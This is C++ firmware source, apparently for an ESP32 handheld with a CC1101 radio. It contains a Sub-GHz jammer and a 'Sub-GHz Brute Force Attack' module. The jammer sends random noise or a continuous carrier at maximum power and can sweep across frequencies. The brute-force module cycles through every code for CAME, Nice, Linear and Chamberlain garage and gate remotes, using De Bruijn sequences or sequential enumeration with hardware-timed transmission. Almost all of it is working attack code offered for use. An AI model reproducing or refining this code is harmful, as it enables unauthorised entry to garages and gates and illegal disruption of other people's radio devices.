// Uses ESP32 RMT peripheral for precise timing (12.5ns resolution, ~100ns jitter)
// Much more effective than software delayMicroseconds() which has 10-150μs jitter
// ============================================================================

static rmt_item32_t noiseSymbols[RMT_NOISE_BATCH];

}  // End namespace subjammer (temporarily for forward declarations)

// Forward declarations for subbrute namespace RMT functions (shared hardware)
// These must be at global scope to properly reference ::subbrute::
namespace subbrute {
    extern bool rmtInitialized;
    bool initRMT();
    void rmtTransmit(rmt_item32_t* items, size_t numItems);
}

namespace subjammer {  // Reopen subjammer namespace

/**
 * Generate and transmit one batch of random noise pulses via RMT
 * Returns true if jamming should continue, false if user requested stop
 */
bool rmtNoiseBurst() {
    // Check if RMT is initialized (shared with brute force module)
    if (!::subbrute::rmtInitialized) {
        return true;  // Let caller handle fallback
    }

    // Generate random pulse patterns
    for (int i = 0; i < RMT_NOISE_BATCH; i++) {
        // Random HIGH duration between NOISE_MIN_PULSE and NOISE_MAX_PULSE microseconds
        uint16_t highTime = random(NOISE_MIN_PULSE, NOISE_MAX_PULSE);
        // Random LOW duration between NOISE_MIN_PULSE and NOISE_MAX_PULSE microseconds
        uint16_t lowTime = random(NOISE_MIN_PULSE, NOISE_MAX_PULSE);

        noiseSymbols[i].level0 = 1;
        noiseSymbols[i].duration0 = highTime;  // RMT ticks = microseconds (CLK_DIV=80)
        noiseSymbols[i].level1 = 0;
        noiseSymbols[i].duration1 = lowTime;
    }

    // Transmit via RMT hardware (using subbrute namespace function)
    ::subbrute::rmtTransmit(noiseSymbols, RMT_NOISE_BATCH);

    // Yield to allow button checks and FreeRTOS tasks
    yield();

    return jammingRunning;  // Return current state
}

/**
 * DEPRECATED: This function is no longer used.
 * RMT noise jamming is now handled inline in subjammerLoop() via rmtNoiseBurst()
 * Keeping code here for reference but it's not called anywhere.
 * TODO: Remove in future cleanup or integrate if blocking mode is needed
 */
// void runRmtNoiseJam() {
//     Serial.println("[JAMMER-RMT] Starting hardware-timed noise jamming");
//     Serial.flush();
//
//     while (jammingRunning && !continuousMode) {
//         // Generate and transmit one noise burst
//         if (!rmtNoiseBurst()) {
//             break;  // User stopped jamming
//         }
//
//         // Quick button check between bursts
//         int btnUpState = pcf.digitalRead(BTN_UP);
//         if (btnUpState == LOW) {
//             // User pressed stop
//             break;
//         }
//     }
//
//     Serial.println("[JAMMER-RMT] Noise jamming stopped");
//     Serial.flush();
// }

void subjammerSetup() {
    Serial.begin(115200);
    Serial.println("[JAMMER-SETUP] Initializing Sub-GHz Jammer...");
    Serial.flush();

    // NRF24 cleanup - release pins and SPI bus before CC1101 init
    pinMode(17, OUTPUT);
    digitalWrite(17, HIGH);        // Deselect NRF24 CSN
    SPI.end();                      // Release SPI bus
    delay(10);
    pinMode(16, INPUT);            // Reconfigure pin 16 for CC1101 GDO0/RX
    Serial.println("[SubGHz] NRF24 cleanup - SPI released for CC1101");

    // Initialize RMT for hardware-timed noise jamming (shared with subbrute)
    if (!::subbrute::initRMT()) {
        Serial.println("[JAMMER-SETUP] RMT init failed - noise mode will use software timing");
    } else {
        Serial.println("[JAMMER-SETUP] RMT initialized - noise mode uses hardware timing");
    }
    Serial.flush();

    // Set GDO0 pin BEFORE Init()
    ELECHOUSE_cc1101.setGDO0(RX_PIN);
    ELECHOUSE_cc1101.Init();
    ELECHOUSE_cc1101.setModulation(2);  // ASK/OOK modulation (0=2-FSK, 1=GFSK, 2=ASK, 3=4-FSK, 4=MSK)
    ELECHOUSE_cc1101.setRxBW(500.0);
    ELECHOUSE_cc1101.setPA(12);         // Max power +12 dBm
    ELECHOUSE_cc1101.setMHZ(targetFrequency);
    // NOTE: Don't call SetTx() here - wait for user to press start button
    // SetTx() is called in subjammerLoop when jammingRunning becomes true

    randomSeed(analogRead(0));

    pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
    pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
    pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
    pcf.pinMode(BTN_UP, INPUT_PULLUP);
    delay(100);

    tft.setRotation(0); 
    tft.fillScreen(TFT_BLACK);

    setupTouchscreen();

   float currentBatteryVoltage = readBatteryVoltage();
   drawStatusBar(currentBatteryVoltage, false);
   updateDisplay();
   uiDrawn = false;
}

void subjammerLoop() {
  
    runUI();
    
    int btnLeftState = pcf.digitalRead(BTN_LEFT);
    int btnRightState = pcf.digitalRead(BTN_RIGHT);
    int btnUpState = pcf.digitalRead(BTN_UP);
    int btnDownState = pcf.digitalRead(BTN_DOWN);

    if (btnUpState == LOW && millis() - lastDebounceTime > debounceDelay) {
        jammingRunning = !jammingRunning;
        if (jammingRunning) {
            Serial.println("Jamming started");
            ELECHOUSE_cc1101.setMHZ(targetFrequency);
            ELECHOUSE_cc1101.SetTx();
        } else {
            Serial.println("Jamming stopped");
            ELECHOUSE_cc1101.setSidle();
            digitalWrite(TX_PIN, LOW);
        }
        updateDisplay();
        lastDebounceTime = millis();
    }

    if (btnRightState == LOW && !autoMode && millis() - lastDebounceTime > debounceDelay) {
        currentFrequencyIndex = (currentFrequencyIndex + 1) % numFrequencies;
        targetFrequency = subghz_frequency_list[currentFrequencyIndex] / 1000000.0;
        ELECHOUSE_cc1101.setMHZ(targetFrequency);
        Serial.print("Switched to: ");
        Serial.print(targetFrequency);
        Serial.println(" MHz");
        updateDisplay();
        lastDebounceTime = millis();
    }
      
    if (btnLeftState == LOW && !autoMode && millis() - lastDebounceTime > debounceDelay) {
        continuousMode = !continuousMode;
        Serial.print("Jamming mode: ");
        Serial.println(continuousMode ? "Continuous Carrier" : "Noise");
        updateDisplay();
        lastDebounceTime = millis();
    }

    if (btnDownState == LOW && millis() - lastDebounceTime > debounceDelay) {
        autoMode = !autoMode;
        Serial.print("Frequency mode: ");
        Serial.println(autoMode ? "Automatic" : "Manual");
        if (autoMode) {
            currentFrequencyIndex = 0;
            targetFrequency = subghz_frequency_list[currentFrequencyIndex] / 1000000.0;
            ELECHOUSE_cc1101.setMHZ(targetFrequency);
        }
        updateDisplay();
        lastDebounceTime = millis();
    }

    if (jammingRunning) {
        if (autoMode) {
            if (millis() - lastSweepTime >= sweepInterval) {
                currentFrequencyIndex = (currentFrequencyIndex + 1) % numFrequencies;
                targetFrequency = subghz_frequency_list[currentFrequencyIndex] / 1000000.0;
                ELECHOUSE_cc1101.setMHZ(targetFrequency);
                ELECHOUSE_cc1101.SetTx();  // Re-enter TX mode after frequency change
                Serial.print("Sweeping: ");
                Serial.print(targetFrequency);
                Serial.println(" MHz");
                updateDisplay();
                lastSweepTime = millis();
            }
        }
        // NOTE: SetTx() is called when jamming starts (button handler) and after freq change (above)
        // No need to call it every loop iteration - wastes SPI cycles

        if (continuousMode) {
            // Continuous carrier mode - hold TX_PIN HIGH
            // CC1101 generates constant carrier at target frequency
            ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, 0xFF);
            ELECHOUSE_cc1101.SpiStrobe(CC1101_STX);
            digitalWrite(TX_PIN, HIGH);
        } else {
            // ============================================================
            // RMT-BASED NOISE JAMMING - Hardware-timed random pulses
            // Much more effective than old software delayMicroseconds(50)
            // RMT gives ~100ns jitter vs 10-150μs with software timing
            // ============================================================
            if (::subbrute::rmtInitialized) {
                // Use RMT hardware for precise random pulse generation
                rmtNoiseBurst();
            } else {
                // Fallback to software timing if RMT not available
                for (int i = 0; i < 10; i++) {
                    uint32_t noise = random(16777216);
                    ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, noise >> 16);
                    ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, (noise >> 8) & 0xFF);
                    ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, noise & 0xFF);
                    ELECHOUSE_cc1101.SpiStrobe(CC1101_STX);
                    delayMicroseconds(50);
                }
            }
        }
    }
  }
}


/*
 *
 * Sub-GHz Brute Force Attack
 * Supports: CAME 12-bit, Nice 12-bit, Linear 10-bit, Chamberlain 9-bit
 * Uses De Bruijn sequence optimization for binary protocols
 *
 */

namespace subbrute {

static bool uiDrawn = false;

#define TX_PIN 26

#define SCREEN_WIDTH 240
#define SCREEN_HEIGHT 320

#define BTN_LEFT   4
#define BTN_RIGHT  5
#define BTN_DOWN   3
#define BTN_UP     6

// Forward declarations
void updateBruteDisplay();
void drawBruteUI();

// Protocol definitions
enum Protocol {
    PROTO_CAME_12 = 0,
    PROTO_NICE_12 = 1,
    PROTO_LINEAR_10 = 2,
    PROTO_CHAMBERLAIN_9 = 3,
    PROTO_COUNT = 4
};

// Protocol timing structures (microseconds)
struct ProtocolDef {
    const char* name;
    uint32_t frequency;     // Hz
    uint8_t bitLength;
    uint16_t shortPulse;    // T
    uint16_t longPulse;     // 2T or 3T
    uint16_t pilotHigh;
    uint16_t pilotLow;
    uint16_t interCodeDelay;
    uint8_t repetitions;
};

// Protocol timing specs from research
const ProtocolDef protocols[PROTO_COUNT] = {
    // CAME 12-bit: 433.92MHz, T=320us (using 250us optimized)
    {"CAME 12-bit", 433920000, 12, 250, 500, 250, 9000, 100, 3},

    // Nice FLO 12-bit: 433.92MHz, T=700us
    {"Nice 12-bit", 433920000, 12, 700, 1400, 700, 25200, 100, 3},

    // Linear 10-bit: 300MHz (or 310MHz), T=500us
    {"Linear 10-bit", 300000000, 10, 500, 1000, 500, 18000, 100, 3},

    // Chamberlain 9-bit: 300MHz, T=500us
    {"Chamberlain 9", 300000000, 9, 500, 1500, 500, 39000, 100, 3}
};

// State variables
int currentProtocol = PROTO_CAME_12;
bool bruteRunning = false;
bool brutePaused = false;
uint32_t currentCode = 0;
uint32_t maxCode = 0;
uint32_t startCode = 0;
uint32_t endCode = 0;
unsigned long startTime = 0;
unsigned long lastDisplayUpdate = 0;
unsigned long lastButtonCheck = 0;

// De Bruijn state for optimized attack
bool useDeBruijn = true;
uint32_t deBruijnBit = 0;
uint32_t deBruijnLength = 0;

// De Bruijn sequence generator state (FKM algorithm - memory efficient)
uint8_t* deBruijnA = nullptr;
int deBruijnN = 0;
int deBruijnT = 0;
int deBruijnP = 0;
int deBruijnOutputIdx = 0;
bool deBruijnHasMore = true;

RCSwitch bruteSwitch = RCSwitch();

// ============================================================
// RMT HARDWARE-TIMED TRANSMISSION (replaces software bit-banging)
// ============================================================
// RMT = Remote Control Transceiver - ESP32 hardware peripheral
// Provides crystal-accurate timing with ZERO jitter
// This is how Flipper Zero and all working implementations do it
// ============================================================

#define RMT_TX_CHANNEL    RMT_CHANNEL_0
#define RMT_CLK_DIV       80              // 80MHz / 80 = 1MHz = 1us per tick
#define RMT_MAX_SYMBOLS   256             // 4 memory blocks * 64 symbols
#define RMT_BATCH_SIZE    64              // Transmit in batches for long sequences

// RMT symbol buffer
static rmt_item32_t rmtSymbols[RMT_MAX_SYMBOLS];
bool rmtInitialized = false;  // Not static - shared with subjammer namespace

// Initialize RMT for OOK transmission
bool initRMT() {
    Serial.println("[RMT-INIT] initRMT() called");
    Serial.flush();

    if (rmtInitialized) {
        Serial.println("[RMT-INIT] Already initialized, returning true");
        Serial.flush();
        return true;
    }

    Serial.printf("[RMT-INIT] TX_PIN = %d, Channel = %d\n", TX_PIN, RMT_TX_CHANNEL);
    Serial.flush();

    // Manual config (portable across ESP-IDF versions)
    rmt_config_t config;
    memset(&config, 0, sizeof(config));

    config.rmt_mode = RMT_MODE_TX;
    config.channel = RMT_TX_CHANNEL;
    config.gpio_num = (gpio_num_t)TX_PIN;
    config.clk_div = RMT_CLK_DIV;  // 80MHz / 80 = 1MHz = 1us per tick
    config.mem_block_num = 4;      // 4 * 64 = 256 symbols max

    // TX-specific config
    config.tx_config.loop_en = false;
    config.tx_config.carrier_en = false;        // No carrier - raw OOK baseband
    config.tx_config.idle_output_en = true;     // Drive pin during idle
    config.tx_config.idle_level = RMT_IDLE_LEVEL_LOW;  // LOW when idle
    config.tx_config.carrier_duty_percent = 50;
    config.tx_config.carrier_freq_hz = 0;
    config.tx_config.carrier_level = RMT_CARRIER_LEVEL_LOW;

    Serial.println("[RMT-INIT] Calling rmt_config()...");
    Serial.flush();

    esp_err_t err = rmt_config(&config);
    if (err != ESP_OK) {
        Serial.printf("[RMT-INIT] rmt_config FAILED: %d\n", err);
        Serial.flush();
        return false;
    }
    Serial.println("[RMT-INIT] rmt_config() SUCCESS");
    Serial.flush();

    Serial.println("[RMT-INIT] Calling rmt_driver_install()...");
    Serial.flush();

    err = rmt_driver_install(RMT_TX_CHANNEL, 0, 0);
    if (err != ESP_OK) {
        Serial.printf("[RMT-INIT] rmt_driver_install FAILED: %d\n", err);
        Serial.flush();
        return false;
    }

    rmtInitialized = true;
    Serial.println("[RMT-INIT] SUCCESS - Hardware TX ready, 1us resolution");
    Serial.flush();
    return true;
}

// Transmit RMT symbols (hardware-timed, blocking)
static uint32_t rmtTxCount = 0;
void rmtTransmit(rmt_item32_t* items, size_t numItems) {
    if (!rmtInitialized) {
        Serial.println("[RMT-TX] ERROR: Not initialized!");
        Serial.flush();
        return;
    }

    rmtTxCount++;

    // Debug first 3 transmissions
    if (rmtTxCount <= 3) {
        Serial.printf("[RMT-TX] #%lu: %d symbols, calling rmt_write_items...\n", rmtTxCount, numItems);
        Serial.flush();
    }

    esp_err_t err = rmt_write_items(RMT_TX_CHANNEL, items, numItems, true);  // true = wait for completion

    if (rmtTxCount <= 3) {
        Serial.printf("[RMT-TX] #%lu: rmt_write_items returned %d\n", rmtTxCount, err);
        Serial.flush();
    }
}

// Encode a single OOK bit into RMT symbol
// Each symbol = one complete bit (HIGH pulse + LOW pulse)
inline void encodeBitToRMT(rmt_item32_t* item, bool bit, const ProtocolDef& proto) {
    if (bit) {
        // '1' bit: long HIGH, short LOW
        item->level0 = 1;
        item->duration0 = proto.longPulse;   // HIGH duration in microseconds
        item->level1 = 0;
        item->duration1 = proto.shortPulse;  // LOW duration in microseconds
    } else {
        // '0' bit: short HIGH, long LOW
        item->level0 = 1;
        item->duration0 = proto.shortPulse;
        item->level1 = 0;
        item->duration1 = proto.longPulse;
    }
}

// Encode pilot/sync pulse into RMT symbol
inline void encodePilotToRMT(rmt_item32_t* item, const ProtocolDef& proto) {
    item->level0 = 1;
    item->duration0 = proto.pilotHigh;
    item->level1 = 0;
    // Handle long pilot LOW (may need multiple symbols if > 32767us)
    item->duration1 = (proto.pilotLow > 32767) ? 32767 : proto.pilotLow;
}

// Legacy software delay - only used for non-critical timing
void safeDelayMicroseconds(uint32_t us) {
    while (us > 16000) {
        delayMicroseconds(16000);
        us -= 16000;
    }
    if (us > 0) {
        delayMicroseconds(us);
    }
}

// Initialize De Bruijn generator for n-bit binary sequence
void initDeBruijn(int n) {
    // FIX BUG 5: Clean up existing allocation first
    if (deBruijnA) {
        delete[] deBruijnA;
        deBruijnA = nullptr;
    }
    deBruijnN = n;
    deBruijnA = new (std::nothrow) uint8_t[n + 1]();  // Zero-initialized

    // FIX BUG 9: Check for allocation failure
    if (deBruijnA == nullptr) {
        Serial.println("[ERROR] De Bruijn allocation failed!");
        deBruijnHasMore = false;
        return;
    }

    deBruijnT = 1;
    deBruijnP = 1;
    deBruijnOutputIdx = 1;
    deBruijnHasMore = true;
    deBruijnLength = (1UL << n);  // 2^n bits total
    deBruijnBit = 0;
}

// FIX BUG 5: Cleanup function for De Bruijn memory
void cleanupDeBruijn() {
    if (deBruijnA) {
        delete[] deBruijnA;
        deBruijnA = nullptr;
    }
    deBruijnHasMore = false;
}

// Get next bit from De Bruijn sequence (-1 when done)
int nextDeBruijnBit() {
    while (deBruijnHasMore) {
        if (deBruijnT > deBruijnN) {
            if (deBruijnN % deBruijnP == 0) {
                // Output a[1..p] - Lyndon word
                if (deBruijnOutputIdx <= deBruijnP) {
                    return deBruijnA[deBruijnOutputIdx++];
                }
                deBruijnOutputIdx = 1;
            }
            // Backtrack
            do {
                deBruijnT--;
                if (deBruijnT == 0) {
                    deBruijnHasMore = false;
                    return -1;
                }
            } while (deBruijnA[deBruijnT] == 1);  // k-1 for binary

            deBruijnA[deBruijnT]++;
            deBruijnP = deBruijnT;
            deBruijnT++;
        } else {
            deBruijnA[deBruijnT] = deBruijnA[deBruijnT - deBruijnP];
            deBruijnT++;
        }
    }
    return -1;
}

// Transmit a single bit using OOK with protocol timing
void transmitBit(bool bit, const ProtocolDef& proto) {
    if (bit) {
        // '1' bit: long HIGH, short LOW (or inverse for some protocols)
        digitalWrite(TX_PIN, HIGH);
        delayMicroseconds(proto.longPulse);
        digitalWrite(TX_PIN, LOW);
        delayMicroseconds(proto.shortPulse);
    } else {
        // '0' bit: short HIGH, long LOW
        digitalWrite(TX_PIN, HIGH);
        delayMicroseconds(proto.shortPulse);
        digitalWrite(TX_PIN, LOW);
        delayMicroseconds(proto.longPulse);
    }
}

// Transmit pilot/sync pulse (uses safe delay for long pulses)
void transmitPilot(const ProtocolDef& proto) {
    digitalWrite(TX_PIN, HIGH);
    safeDelayMicroseconds(proto.pilotHigh);
    digitalWrite(TX_PIN, LOW);
    safeDelayMicroseconds(proto.pilotLow);  // FIX BUG 2: pilotLow can be >16383us
}

// FIX BUG 6: RCSwitch protocol mapping for each supported protocol
// RCSwitch protocols: 1=350us(basic), 2=650us, 4=380us(garage), 5=500us, 6=450us(HT6P20B)
const int rcSwitchProtocolMap[PROTO_COUNT] = {
    1,   // CAME 12-bit: Protocol 1 (350us closest to 320us)
    2,   // Nice FLO 12-bit: Protocol 2 (650us close to 700us)
    5,   // Linear 10-bit: Protocol 5 (500us match)
    1    // Chamberlain: Protocol 1 (but rolling codes won't brute force)
};

// Transmit a complete code using RCSwitch (more reliable)
void transmitCode(uint32_t code, const ProtocolDef& proto) {
    // FIX BUG 6: Use correct RCSwitch protocol for each Sub-GHz protocol
    int rcProto = rcSwitchProtocolMap[currentProtocol];
    bruteSwitch.setProtocol(rcProto);
    bruteSwitch.setPulseLength(proto.shortPulse);

    for (int rep = 0; rep < proto.repetitions; rep++) {
        bruteSwitch.send(code, proto.bitLength);
        safeDelayMicroseconds(proto.interCodeDelay);  // Use safe delay
        yield();  // Feed watchdog between repetitions
    }
}

// ============================================================
// RMT-BASED De Bruijn TRANSMISSION (HARDWARE-TIMED, ZERO JITTER)
// ============================================================
// This function uses ESP32 RMT peripheral for crystal-accurate OOK timing.
// Unlike software delayMicroseconds() which has 10-150μs jitter on FreeRTOS,
// RMT provides 1μs resolution with zero jitter - same approach as Flipper Zero.
// ============================================================

void transmitDeBruijnStream(const ProtocolDef& proto) {
    Serial.println("[DEBUG 1] transmitDeBruijnStream() ENTERED");
    Serial.flush();

    Serial.printf("[DEBUG 2] Protocol: %s, Freq: %.2f MHz, Bits: %d\n",
                  proto.name, proto.frequency / 1000000.0, proto.bitLength);
    Serial.flush();

    // Verify RMT is initialized
    Serial.printf("[DEBUG 3] rmtInitialized = %d\n", rmtInitialized);
    Serial.flush();

    if (!rmtInitialized) {
        Serial.println("[DEBUG 3a] ERROR: RMT not initialized! Attempting init...");
        Serial.flush();
        if (!initRMT()) {
            Serial.println("[DEBUG 3b] RMT init FAILED - aborting");
            Serial.flush();
            return;
        }
        Serial.println("[DEBUG 3c] RMT init SUCCESS on retry");
        Serial.flush();
    }

    // CRITICAL: Wait for START button to be released before beginning
    Serial.println("[DEBUG 4] Waiting for button release...");
    Serial.flush();

    int waitCount = 0;
    while (pcf.digitalRead(BTN_UP) == LOW) {
        yield();
        delay(10);
        waitCount++;
        if (waitCount % 50 == 0) {
            Serial.printf("[DEBUG 4a] Still waiting... count=%d\n", waitCount);
            Serial.flush();
        }
        if (waitCount > 500) {  // 5 second timeout
            Serial.println("[DEBUG 4b] TIMEOUT waiting for button release!");
            Serial.flush();
            return;
        }
    }
    delay(100);  // Extra debounce
    Serial.println("[DEBUG 5] Button released, configuring CC1101...");
    Serial.flush();

    // Configure CC1101 for transmission
    Serial.println("[DEBUG 6] setModulation(2)...");
    Serial.flush();
    ELECHOUSE_cc1101.setModulation(2);  // ASK/OOK mode

    Serial.printf("[DEBUG 7] setMHZ(%.2f)...\n", proto.frequency / 1000000.0);
    Serial.flush();
    ELECHOUSE_cc1101.setMHZ(proto.frequency / 1000000.0);

    Serial.println("[DEBUG 8] setPA(12)...");
    Serial.flush();
    ELECHOUSE_cc1101.setPA(12);  // Max power

    Serial.println("[DEBUG 9] SetTx()...");
    Serial.flush();
    ELECHOUSE_cc1101.SetTx();

    Serial.println("[DEBUG 10] CC1101 configured - sending pilot pulse...");
    Serial.flush();

    // Send pilot pulse using RMT (hardware-timed)
    Serial.printf("[DEBUG 11] Pilot: HIGH=%d, LOW=%d\n", proto.pilotHigh, proto.pilotLow);
    Serial.flush();

    rmtSymbols[0].level0 = 1;
    rmtSymbols[0].duration0 = proto.pilotHigh;
    rmtSymbols[0].level1 = 0;
    rmtSymbols[0].duration1 = (proto.pilotLow > 32767) ? 32767 : proto.pilotLow;

    Serial.println("[DEBUG 12] Calling rmtTransmit for pilot...");
    Serial.flush();
    rmtTransmit(rmtSymbols, 1);
    Serial.println("[DEBUG 13] Pilot pulse sent!");
    Serial.flush();

    // Initialize De Bruijn generator
    Serial.printf("[DEBUG 14] initDeBruijn(%d)...\n", proto.bitLength);
    Serial.flush();
    initDeBruijn(proto.bitLength);

    if (!deBruijnHasMore) {
        Serial.println("[DEBUG 14a] ERROR: De Bruijn init failed!");
        Serial.flush();
        ELECHOUSE_cc1101.setSidle();
        return;
    }
    Serial.printf("[DEBUG 15] De Bruijn ready, total bits: %lu\n", deBruijnLength);
    Serial.flush();

    uint32_t bitsSent = 0;
    uint32_t totalBits = deBruijnLength + proto.bitLength - 1;
    int symbolIdx = 0;
    uint32_t batchCount = 0;

    Serial.println("[DEBUG 16] Entering main transmission loop...");
    Serial.flush();

    // Main transmission loop - build and send RMT batches
    int bit;
    while ((bit = nextDeBruijnBit()) >= 0 && bruteRunning) {
        // Encode bit into RMT symbol
        encodeBitToRMT(&rmtSymbols[symbolIdx], bit == 1, proto);
        symbolIdx++;
        bitsSent++;
        deBruijnBit = bitsSent;

        // When batch is full, transmit it
        if (symbolIdx >= RMT_BATCH_SIZE) {
            batchCount++;

            // Debug first few batches
            if (batchCount <= 3) {
                Serial.printf("[DEBUG 17] Batch %lu: transmitting %d symbols...\n", batchCount, symbolIdx);
                Serial.flush();
            }

            // Hardware-timed transmission (blocking until complete)
            rmtTransmit(rmtSymbols, symbolIdx);

            if (batchCount <= 3) {
                Serial.printf("[DEBUG 18] Batch %lu complete\n", batchCount);
                Serial.flush();
            }

            symbolIdx = 0;

            // Feed watchdog
            yield();

            // Check for STOP button
            if (pcf.digitalRead(BTN_UP) == LOW) {
                Serial.println("[DEBUG] Stop button detected!");
                Serial.flush();
                bruteRunning = false;
                break;
            }

            // Check for PAUSE button
            if (pcf.digitalRead(BTN_DOWN) == LOW) {
                Serial.println("[DEBUG] Pause button detected!");
                Serial.flush();
                brutePaused = true;
                delay(200);  // Debounce

                // Pause loop
                while (brutePaused && bruteRunning) {
                    yield();
                    updateBruteDisplay();

                    if (pcf.digitalRead(BTN_DOWN) == LOW) {
                        brutePaused = false;
                        delay(200);
                    }
                    if (pcf.digitalRead(BTN_UP) == LOW) {
                        bruteRunning = false;
                        brutePaused = false;
                    }
                    delay(50);
                }
            }

            // Update display every 4 batches (~256 bits)
            if ((bitsSent & 0xFF) == 0) {
                updateBruteDisplay();
            }

            // Progress every 100 batches
            if (batchCount % 100 == 0) {
                Serial.printf("[DEBUG] Progress: %lu bits sent, %lu batches\n", bitsSent, batchCount);
                Serial.flush();
            }
        }
    }

    Serial.printf("[DEBUG 19] Loop exited. bitsSent=%lu, bruteRunning=%d\n", bitsSent, bruteRunning);
    Serial.flush();

    // Transmit any remaining symbols in partial batch
    if (symbolIdx > 0 && bruteRunning) {
        rmtTransmit(rmtSymbols, symbolIdx);
        symbolIdx = 0;
    }

    // Add trailing zero bits to complete the De Bruijn cycle
    if (bruteRunning) {
        int trailingBits = proto.bitLength - 1;
        symbolIdx = 0;
        for (int i = 0; i < trailingBits; i++) {
            encodeBitToRMT(&rmtSymbols[symbolIdx++], false, proto);
            if (symbolIdx >= RMT_BATCH_SIZE) {
                rmtTransmit(rmtSymbols, symbolIdx);
                symbolIdx = 0;
                yield();
            }
        }
        if (symbolIdx > 0) {
            rmtTransmit(rmtSymbols, symbolIdx);
        }
    }

    // Cleanup
    ELECHOUSE_cc1101.setSidle();
    cleanupDeBruijn();

    Serial.printf("[RMT-BRUTE] Attack finished. Bits sent: %lu, Running: %d\n",
                  deBruijnBit, bruteRunning);
    Serial.println("[RMT-BRUTE] Hardware-timed transmission complete - zero jitter achieved!");
}

// ============================================================
// RMT-BASED Sequential Brute Force (HARDWARE-TIMED)
// ============================================================
// Sends each code individually with proper framing using RMT
// ============================================================

void runSequentialBrute(const ProtocolDef& proto) {
    Serial.println("[DEBUG-SEQ 1] runSequentialBrute() ENTERED");
    Serial.flush();

    // Verify RMT is initialized
    if (!rmtInitialized) {
        Serial.println("[DEBUG-SEQ 2] RMT not initialized, attempting...");
        Serial.flush();
        if (!initRMT()) {
            Serial.println("[DEBUG-SEQ 2a] RMT init FAILED!");
            Serial.flush();
            return;
        }
    }

    // Wait for button release
    Serial.println("[DEBUG-SEQ 3] Waiting for button release...");
    Serial.flush();

    int waitCount = 0;
    while (pcf.digitalRead(BTN_UP) == LOW) {
        yield();
        delay(10);
        waitCount++;
        if (waitCount > 500) {
            Serial.println("[DEBUG-SEQ 3a] TIMEOUT!");
            Serial.flush();
            return;
        }
    }
    delay(100);

    Serial.println("[DEBUG-SEQ 4] Configuring CC1101...");
    Serial.flush();

    // Configure CC1101
    ELECHOUSE_cc1101.setModulation(2);
    ELECHOUSE_cc1101.setMHZ(proto.frequency / 1000000.0);
    ELECHOUSE_cc1101.setPA(12);
    ELECHOUSE_cc1101.SetTx();

    Serial.printf("[DEBUG-SEQ 5] Starting loop: codes %lu to %lu\n", startCode, endCode);
    Serial.flush();

    uint32_t codesTransmitted = 0;

    for (uint32_t code = startCode; code <= endCode && bruteRunning; code++) {
        currentCode = code;

        // Build RMT symbols for this code: pilot + data bits
        int symbolIdx = 0;

        // Add pilot pulse
        rmtSymbols[symbolIdx].level0 = 1;
        rmtSymbols[symbolIdx].duration0 = proto.pilotHigh;
        rmtSymbols[symbolIdx].level1 = 0;
        rmtSymbols[symbolIdx].duration1 = (proto.pilotLow > 32767) ? 32767 : proto.pilotLow;
        symbolIdx++;

        // Add data bits (MSB first)
        for (int i = proto.bitLength - 1; i >= 0; i--) {
            bool bit = (code >> i) & 1;
            encodeBitToRMT(&rmtSymbols[symbolIdx], bit, proto);
            symbolIdx++;
        }

        // Transmit this code (with repetitions)
        for (int rep = 0; rep < proto.repetitions && bruteRunning; rep++) {
            rmtTransmit(rmtSymbols, symbolIdx);

            // Inter-code delay (use safe delay for gaps > 32ms)
            if (proto.interCodeDelay > 0) {
                if (proto.interCodeDelay > 32000) {
                    delay(proto.interCodeDelay / 1000);
                } else {
                    delayMicroseconds(proto.interCodeDelay);
                }
            }
            yield();
        }

        codesTransmitted++;

        // Debug first few codes
        if (codesTransmitted <= 3) {
            Serial.printf("[DEBUG-SEQ 6] Code 0x%03lX transmitted (%d symbols)\n", code, symbolIdx);
            Serial.flush();
        }

        // Check buttons every 16 codes
        if ((code & 0x0F) == 0) {
            yield();

            if (pcf.digitalRead(BTN_UP) == LOW) {
                Serial.println("[DEBUG-SEQ] Stop detected!");
                Serial.flush();
                bruteRunning = false;
                break;
            }

            if (pcf.digitalRead(BTN_DOWN) == LOW) {
                brutePaused = !brutePaused;
                delay(300);
            }
        }

        // Update display every 100 codes
        if ((code % 100) == 0 || code == endCode) {
            updateBruteDisplay();
        }

        // Pause handling
        while (brutePaused && bruteRunning) {
            yield();
            if (pcf.digitalRead(BTN_DOWN) == LOW) {
                brutePaused = false;
                delay(300);
            }
            if (pcf.digitalRead(BTN_UP) == LOW) {
                bruteRunning = false;
            }
            updateBruteDisplay();
            delay(50);
        }

        // Progress every 500 codes
        if (codesTransmitted % 500 == 0) {
            Serial.printf("[DEBUG-SEQ] Progress: %lu codes sent\n", codesTransmitted);
            Serial.flush();
        }
    }

    ELECHOUSE_cc1101.setSidle();

    Serial.printf("[DEBUG-SEQ 7] Finished. Codes transmitted: %lu\n", codesTransmitted);
    Serial.flush();
}

void updateBruteDisplay() {
    if (millis() - lastDisplayUpdate < 300) return;  // Less frequent = less lag
    lastDisplayUpdate = millis();

    yield();  // Yield before heavy display operations

    const ProtocolDef& proto = protocols[currentProtocol];

    // Only clear the dynamic progress area (y=115 to y=225) - faster than full clear
    tft.fillRect(0, 115, 240, 115, TFT_BLACK);

    // Protocol info (static - drawn once in header, skip redrawing)
    tft.setTextSize(1);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setCursor(10, 85);
    tft.print("Protocol: ");
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.print(proto.name);

    // Frequency
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setCursor(10, 100);
    tft.print("Freq: ");
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.printf("%.2f MHz", proto.frequency / 1000000.0);

    // Mode
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setCursor(130, 100);
    tft.print("Mode: ");
    tft.setTextColor(useDeBruijn ? TFT_GREEN : TFT_YELLOW, TFT_BLACK);
    tft.print(useDeBruijn ? "DeBruijn" : "Sequential");

    // Progress - calculate differently for De Bruijn vs Sequential mode
    float progress = 0;
    if (useDeBruijn && bruteRunning) {
        // De Bruijn mode: use bit position
        uint32_t totalBits = deBruijnLength + proto.bitLength - 1;
        progress = (totalBits > 0) ? (deBruijnBit * 100.0 / totalBits) : 0;
    } else {
        // Sequential mode: use code position
        uint32_t total = endCode - startCode + 1;
